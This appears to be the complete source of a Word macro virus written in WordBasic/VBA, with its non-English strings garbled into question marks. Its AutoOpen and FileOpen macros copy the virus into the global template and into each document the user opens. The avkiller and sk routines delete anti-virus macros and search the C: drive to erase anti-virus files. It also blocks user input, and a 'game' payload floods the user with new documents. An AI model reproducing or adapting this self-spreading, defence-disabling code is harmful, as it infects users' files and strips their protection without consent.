   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "????????????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
   'check
   WordBasic.MsgBox " ? ? ? ? ? ? ? ? ? ! "
   End Sub

   Attribute VB_Name = "ZlockMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "?? ZLOCK ????---ZlockMacro     "
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ZlockMacro.MAIN"
       'Check
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "??????????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
   Dim s$
   Dim fn$
   Dim cm1
   Dim j
   Dim tt
   'check
   On Error Resume Next
   Err.Number = 0
   s$ = WordBasic.[DefaultDir$](8) + "\WORD.DOT"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg
   fn$ = dlg.Name
   cm1 = WordBasic.CountMacros(1)
   If cm1 > 0 Then
      For j = 1 To cm1
         If WordBasic.[MacroName$](j, 1) = "ERASER" Then tt = 1
      Next j
   End If
   If tt <> 1 Then
      WordBasic.FileSaveAs Format:=1
   WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="ERASER", Tab:=1 + 2

   WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="AutoOpen", Tab:=1 + 2

   WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileNew", Tab:=1 + 2

   WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileOpen", Tab:=1 + 2

   WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="ZlockMacro", Tab:=1 + 2

   WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="Game", Tab:=1 + 2

   WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="ToolsMacro", Tab:=1 + 2

   WordBasic.DocClose 1
   If WordBasic.Day(WordBasic.Now()) <= 20 Then
   WordBasic.Call "game"
   End If
   exit_:
   End If
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "??????????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   'check
   WordBasic.Call "ERASER"
   End Sub

   Attribute VB_Name = "FileNew"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "????????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileNew.MAIN"
   Dim t
   Dim a$
   Dim s$
   'check
   On Error GoTo -1: On Error GoTo exit_
   t = WordBasic.Second(WordBasic.Now())
   a$ = WordBasic.[Right$](Str(t), 1)
   s$ = WordBasic.[DefaultDir$](8) + "\WORD.DOT"
   WordBasic.FileNew Template:=s$, NewTemplate:=1
   WordBasic.FileSaveAs Format:=1, Name:="DOC" + a$ + ".doc"
   If WordBasic.Day(WordBasic.Now()) <= 20 Then
   WordBasic.Call "game"

   exit_:
   End If
   End Sub

   Attribute VB_Name = "ERASER"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "???????? "
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ERASER.MAIN"
   Dim fn$
   Dim s$
   Dim cm
   Dim i
   Dim t
   'check
   WordBasic.DisableInput 1
   On Error GoTo -1: On Error GoTo exit_
   avkiller
   sk
   fn$ = WordBasic.[FileName$]()
   s$ = WordBasic.[DefaultDir$](8) + "\WORD.DOT"
   cm = WordBasic.CountMacros(0, 0, 1)
   If cm > 0 Then
      For i = 1 To cm
         If WordBasic.[MacroName$](i, 0, 0, 1) = "REASER" Then t = 1
      Next i
   End If
   If t <> 1 Then
     WordBasic.FileSaveAs Name:=s$, Format:=1
   WordBasic.DocClose 1
   WordBasic.MsgBox " WORD ? ? ? ? ? ? ? (MRG.DOC)", 64
   WordBasic.MsgBox " WORD ? ? ? ? ? ? , ? ? ? ? ? ? ? .", 64
   WordBasic.FileExit 1
   End If

   exit_:
   End Sub

   Private Sub avkiller()
   Dim nor$
   WordBasic.DisableAutoMacros 0
   On Error Resume Next
   Dim ggdlg As Object: Set ggdlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo ggdlg
   nor$ = ggdlg.Template
   WordBasic.ToolsMacro Name:="AutoExec", Show:=1, Delete:=1

   WordBasic.ToolsMacro Name:="FileOpen", Show:=1, Delete:=1

   WordBasic.ToolsMacro Name:="DetectFile", Show:=1, Delete:=1

   Dim kkdlg As Object: Set kkdlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo kkdlg
   nor$ = kkdlg.Template
   WordBasic.Organizer Delete:=1, Source:=nor$, Name:="Z-Macro", Tab:=1

   WordBasic.Organizer Delete:=1, Source:=nor$, Name:="Z-Setup", Tab:=1

   On Error Resume Next
   WordBasic.Organizer Delete:=1, Source:=nor$, Name:="Z-Scan", Tab:=1


   done:
   End Sub


   Private Sub sk()
   Dim a$
   Dim b$
   WordBasic.DisableInput 1
   On Error GoTo -1: On Error GoTo exit_
   WordBasic.FileFind SearchPath:="c:\", Name:="z-macroc.doc", SubDir:=1
   a$ = WordBasic.[FoundFileName$](1)
   If a$ = "" Then GoTo sk1 Else
   WordBasic.Kill a$

   sk1:
   WordBasic.FileFind SearchPath:="c:\", Name:="gscan.com", SubDir:=1
   b$ = WordBasic.[FoundFileName$](1)
   If b$ = "" Then GoTo bye Else
   WordBasic.Kill b$

   bye:

   End Sub

   Attribute VB_Name = "Game"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "NEW-MACRO-GAME"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Game.MAIN"
   Dim num
   Dim ans
   Dim L
   'check
   On Error Resume Next
   WordBasic.DisableInput 1
   WordBasic.BeginDialog 250, 250, " ? ? ? ? ? ? ?"
       WordBasic.PushButton 11, 6, 47, 21, "1", "Push1"
       WordBasic.PushButton 71, 7, 47, 21, "2", "Push4"
       WordBasic.PushButton 129, 6, 47, 21, "3", "Push7"
       WordBasic.PushButton 129, 37, 47, 21, "4", "Push8"
       WordBasic.PushButton 130, 66, 47, 21, "5", "Push9"
       WordBasic.PushButton 188, 6, 47, 21, "6", "Push10"
       WordBasic.PushButton 71, 36, 47, 21, "7", "Push5"
       WordBasic.PushButton 71, 66, 47, 21, "8", "Push6"
       WordBasic.PushButton 10, 36, 47, 21, "9", "Push2"
       WordBasic.PushButton 9, 66, 49, 21, "0", "Push3"
       WordBasic.Text 12, 94, 218, 13, "?????????????", "Text1"
       WordBasic.Text 12, 113, 142, 13, "?????????", "Text2"
       WordBasic.Text 12, 132, 149, 13, "??????????", "Text3"
       WordBasic.Text 12, 151, 122, 13, "???????", "Text4"
       WordBasic.Text 12, 170, 174, 13, "??????????", "Text5"
       WordBasic.OKButton 9, 191, 105, 21
       WordBasic.TextBox 10, 220, 160, 18, "TextBox2"
   WordBasic.EndDialog
   Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog

   mgame:
   num = WordBasic.Int(Rnd() * 10) + 1
   ans = WordBasic.Dialog.UserDialog(gdh)
   If gdh.textbox2 = "gdh's new macro game-1" Then GoTo exit_
   If ans = num Then
   WordBasic.Beep
   WordBasic.Beep
   WordBasic.Beep
   WordBasic.Beep
   WordBasic.MsgBox " ? ? ? !! ? ? ?!!", " ? ? ? ? ? ? ? "

   WordBasic.Beep
   WordBasic.FileNewDefault
   WordBasic.DocMaximize 1
   WordBasic.CenterPara
   WordBasic.FormatFont Points:=32, Bold:=1, Underline:=1, Color:=1
   WordBasic.CenterPara
   WordBasic.Insert " ? ? ? ? ? ? ? !! ? ? !! ? ? ? ? ? ? ? ? ? ? !!  "
   WordBasic.DocClose 1


   GoTo exit_
   End If

   For L = 1 To 10
   WordBasic.Beep
   WordBasic.FileNewDefault
   If WordBasic.DocMaximize() <> 0 Then WordBasic.DocRestore
   WordBasic.CenterPara
   WordBasic.FormatFont Points:=64, Bold:=1, Underline:=1, Color:=2
   WordBasic.Insert " ? ? ? ? ? ? ? !! "
   Next L
   GoTo mgame
   'End If

   exit_:
   End Sub
